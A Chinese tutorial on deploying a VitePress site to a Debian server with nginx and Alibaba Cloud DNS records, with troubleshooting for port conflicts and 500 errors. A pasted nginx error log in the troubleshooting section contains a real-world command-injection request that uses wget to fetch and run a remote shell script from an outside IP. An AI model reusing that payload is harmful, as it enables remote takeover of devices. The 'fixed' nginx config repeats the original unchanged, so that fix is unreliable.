---
title: 网站部署教程
description: 教你如何在互联网上留下自己的网站
tags:
  - 学习
  - 网站部署
---

# 网页部署教程

## 一、预备工作

1. 在阿里云网站上购买一个域名
2. 准备一台服务器，最好是 Linux 系统，debain 系统
3. 参考 vue 教程，建立一个 vitepress 项目开源到 github 上

## 二、指令操作

### 1. 服务器操作

在获取服务器后，得到的信息应该有：

- 服务器 IP 地址，通常是`xxx.xxx.xxx.xxx`
- 用户名：如`root`
- 密码：如`xxxxxx`

首先使用`ssh`指令连接服务器

```bash
ssh root@xxx.xxx.xxx.xxx
```

然后输入密码，成功连接后，输入以下指令：

```bash
cd /root
```

然后输入以下指令（根据需求使用`sudo`前缀）：

```bash
apt update
apt install git nginx -y
```

拉取项目到服务器上：

```bash
# 请提供您的 GitHub 仓库地址，例如：
git clone https://github.com/用户名称/仓库名.git /var/www/wiki
```

安装 node.js 和 依赖：

```bash
# 安装 Node.js（VitePress 需要）
curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
apt install nodejs -y

# 进入项目目录
cd /var/www/wiki

# 安装依赖
npm install

# 构建静态文件
npm run build
```

配置 nginx 文件：

```bash
# 创建 Nginx 配置
cat > /etc/nginx/sites-available/wiki << 'EOF'
server {
    listen 80;
    server_name lingchat.work docs.lingchat.work;

    # 这里填写的是构造产物的路径，保证构造产物存在
    root /var/www/wiki/docs/.vitepress/dist;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # 修复：确保静态资源正确加载
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
EOF

# 启用站点
ln -s /etc/nginx/sites-available/wiki /etc/nginx/sites-enabled/
nginx -t  # 测试配置
systemctl reload nginx
systemctl restart nginx
```

### 2. 配置域名解析

阿里云购买域名之后，需要配置域名解析，将域名指向服务器的 IP 地址。在阿里云域名控制台添加 A 记录指向 服务器ip`xxx.xxx.xxx.xxx`

在阿里云解析界面添加记录，这里用我的网站举个例子：

#### 记录 1：主域名（让 lingchat.work 也能访问）

- 记录类型：A
- 主机记录：@ （表示主域名）
- 记录值：`xxx.xxx.xxx.xxx`（服务器 IP）

#### 记录 2：wiki 子域名（主要用这个）

- 记录类型：
- 主机记录：docs（表示 docs.lingchat.work）
- 记录值：`xxx.xxx.xxx.xxx`（服务器 IP）

配置如下：
| 字段 | 填写内容 |
| --- | --- |
| 记录类型 | A |
| 主机记录 | @ |
| 解析请求来源 | 默认 |
| 记录值 | 154.82.20.106 |
| TTL | 默认（10分钟） |

## 三、主机测试与联通

1. 在浏览器输入 `http://lingchat.work` 或 `http://docs.lingchat.work`，如果看到 VitePress 生成的页面，说明配置成功。

2. 在服务器上可以使用 `curl` 或者主机用 `ping` 命令测试是否能连接到网站：

```bash
curl http://lingchat.work
curl http://docs.lingchat.work
```

如果返回 VitePress 生成的页面内容，说明配置成功。

> [!INFO] 注意，由于还没有用 https 加密，所以访问时会有安全警告，而且不能直接在浏览器输入没有带 http 前缀的地址，否则有概率进不去。

## 四、部署中的疑难杂症

### 1. Nginx 重启失败

操作问题信息如下：

```bash
root@VM-aB9m29Sj:/var/www/wiki# ln -s /etc/nginx/sites-available/wiki /etc/nginx/sites-enabled/
root@VM-aB9m29Sj:/var/www/wiki# nginx -t  # 测试配置
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
root@VM-aB9m29Sj:/var/www/wiki# systemctl restart nginx
Job for nginx.service failed because the control process exited with error code.
See "systemctl status nginx.service" and "journalctl -xeu nginx.service" for details.
root@VM-aB9m29Sj:/var/www/wiki#
```

使用这个指令查看日志：

```bash
systemctl status nginx.service
```

这里我遇到的问题的日志信息如下：

```bash
root@VM-aB9m29Sj:/var/www/wiki# systemctl status nginx.service
× nginx.service - A high performance web server and a reverse proxy server
     Loaded: loaded (/lib/systemd/system/nginx.service; enabled; preset: enabled)
     Active: failed (Result: exit-code) since Sat 2026-09-05 19:48:46 CST; 2min 48s ago
       Docs: man:nginx(8)
    Process: 242405 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCESS)
    Process: 242406 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=1/FAILURE)
        CPU: 13ms

Sep 05 19:48:44 VM-aB9m29Sj systemd[1]: Starting nginx.service - A high performance web server and a reverse proxy serv>
Sep 05 19:48:44 VM-aB9m29Sj nginx[242406]: nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Sep 05 19:48:44 VM-aB9m29Sj nginx[242406]: nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Sep 05 19:48:45 VM-aB9m29Sj nginx[242406]: nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Sep 05 19:48:45 VM-aB9m29Sj nginx[242406]: nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Sep 05 19:48:46 VM-aB9m29Sj nginx[242406]: nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)
Sep 05 19:48:46 VM-aB9m29Sj nginx[242406]: nginx: [emerg] still could not bind()
Sep 05 19:48:46 VM-aB9m29Sj systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE
Sep 05 19:48:46 VM-aB9m29Sj systemd[1]: nginx.service: Failed with result 'exit-code'.
Sep 05 19:48:46 VM-aB9m29Sj systemd[1]: Failed to start nginx.service - A high performance web server and a reverse pro>
lines 1-18/18 (END)
```

说明 `80` 端口已经被占用，需要先关闭占用 `80` 端口的进程，再启动 `nginx`。操作：

```bash
# 查看哪个玩意占用了80端口
netstat -tlnp | grep :80
# 或者
lsof -i :80
```

> `netstat` 需要配置环境，可以用后面那个

返回信息如下所示：

```bash
root@VM-aB9m29Sj:/var/www/wiki# ss -tlnp | grep :80
LISTEN 0      65535        0.0.0.0:80        0.0.0.0:*    users:(("haproxy",pid=117105,fd=6))
root@VM-aB9m29Sj:/var/www/wiki#
```

停止占用 `80` 端口的进程即可，这里是 `haproxy` 导致的：

```bash
# 停止 HAProxy
systemctl stop haproxy

# 禁用 HAProxy 开机自启
systemctl disable haproxy

# 启动 Nginx
systemctl start nginx

# 检查状态
systemctl status nginx
```

### 2. 构造产物消失导致的各种奇怪问题

有关构造产物查看的调试指令：

```bash
# 查看 /var/www/wiki 目录结构，如果没有 dist 目录说明没构造出来
ls -la /var/www/wiki/
```

假如没有构造产物，nginx 会指向默认的网站或者进入 `500` 报错：

#### i. 进入默认网站解决思路

```bash
# 查看启用的站点
ls -la /etc/nginx/sites-enabled/

# 删除默认站点的软链接
rm -f /etc/nginx/sites-enabled/default

# 或者如果有 default 文件
rm -f /etc/nginx/sites-enabled/default

# 确认 wiki 配置已启用
# 检查软链接是否存在
ls -la /etc/nginx/sites-enabled/wiki

# 如果没有，重新创建
ln -s /etc/nginx/sites-available/wiki /etc/nginx/sites-enabled/

# 测试并重载
nginx -t
systemctl reload nginx

curl http://localhost
```

#### ii. 进入 500 报错解决思路

```bash
# 假如说刚刚查到了没构造产物
cd /var/www/wiki
npm run build

# 最好根据程序返回情况，重新设置一下
cat > /etc/nginx/sites-available/wiki << 'EOF'
server {
    listen 80;
    server_name lingchat.work docs.lingchat.work;

    # 这里填写的是构造产物的路径，保证构造产物存在
    root /var/www/wiki/docs/.vitepress/dist;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # 修复：确保静态资源正确加载
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
EOF

# 启用站点
ln -s /etc/nginx/sites-available/wiki /etc/nginx/sites-enabled/
nginx -t  # 测试配置
systemctl reload nginx
systemctl restart nginx

# 测试
curl http://localhost
```

### 3. 500 报错解决思路

假如说 nginx 出现了下面的报错日志：

```bash
# 注意这里的日志显示 dist 构建产物已经存在了，但是还是 500 报错
root@VM-aB9m29Sj:/var/www/wiki# ls -la /var/www/wiki/docs/.vitepress/dist/
total 544
drwxr-xr-x 9 root root   4096 Sep  5 20:02 .
drwxr-xr-x 4 root root     48 Sep  5 20:02 ..
-rw-r--r-- 1 root root  11986 Sep  5 20:02 404.html
drwxr-xr-x 3 root root   8192 Sep  5 20:02 assets
drwxr-xr-x 2 root root    105 Sep  5 20:02 community
drwxr-xr-x 2 root root   4096 Sep  5 20:02 creator
drwxr-xr-x 2 root root    181 Sep  5 20:02 design
-rw-r--r-- 1 root root 381038 Sep  5 20:02 favicon.ico
drwxr-xr-x 2 root root    157 Sep  5 20:02 guide
-rw-r--r-- 1 root root   1247 Sep  5 20:02 hashmap.json
drwxr-xr-x 2 root root   4096 Sep  5 20:02 images
-rw-r--r-- 1 root root  62233 Sep  5 20:02 index.html
drwxr-xr-x 2 root root   4096 Sep  5 20:02 manual
-rw-r--r-- 1 root root  54995 Sep  5 20:02 SOURCES.html
-rw-r--r-- 1 root root    900 Sep  5 20:02 vp-icons.css
root@VM-aB9m29Sj:/var/www/wiki# nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
root@VM-aB9m29Sj:/var/www/wiki# systemctl reload nginx
root@VM-aB9m29Sj:/var/www/wiki# curl http://localhost
<html>
<head><title>500 Internal Server Error</title></head>
<body>
<center><h1>500 Internal Server Error</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>

# 这里是查看日志的另一种方式
root@VM-aB9m29Sj:/var/www/wiki# tail -30 /var/log/nginx/error.log

2026/09/05 20:00:20 [error] 242602#242602: *2 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 127.0.0.1, server: lingchat.work, request: "GET / HTTP/1.1", host: "localhost"
2026/09/05 20:01:57 [error] 242602#242602: *3 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 89.42.231.200, server: lingchat.work, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F162.249.125.145%2Fooo.sh+-O-+|+sh%60) HTTP/1.1", host: "154.82.20.106:80"
2026/09/05 20:03:29 [error] 242713#242713: *4 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 127.0.0.1, server: lingchat.work, request: "GET / HTTP/1.1", host: "localhost"
root@VM-aB9m29Sj:/var/www/wiki#
```

错误是 `rewrite or internal redirection cycle while internally redirecting to "/index.html"`，这是 Nginx 配置中的 `try_files` 导致的重定向循环。

解决方法就是添加修复配置，这个我在上面的已经写好了，假如说遇到类似问题可以从这个思路解决：

```bash
解决方案：修改 Nginx 配置
bash
cat > /etc/nginx/sites-available/wiki << 'EOF'
server {
    listen 80;
    server_name lingchat.work docs.lingchat.work;

    root /var/www/wiki/docs/.vitepress/dist;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # 修复：确保静态资源正确加载
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
EOF

nginx -t
systemctl reload nginx

# 测试
curl http://localhost
# 在服务器上测试域名是否能被解析
curl -H "Host: lingchat.work" http://localhost
```

### 4. 无法进入网站，域名解析问题等

> [!INFO] 无法进入网站有可能是 DNS 解析速度问题，可以等 10 分钟或者 2 小时。在那之前先用 ping 服务器ip，ping 域名的方式试试看是服务器问题还是主机问题还是域名解析问题。

在主机上使用以下调试命令：

```bash
ping docs.lingchat.work
nslookup docs.lingchat.work
```

日志正常说明是浏览器问题，不正常说明是解析问题。服务器问题详见前面的章节。

如果浏览器打不开，可能是缓存问题，比如我用谷歌访问就访问不了，换火狐就行了。是个坑点。
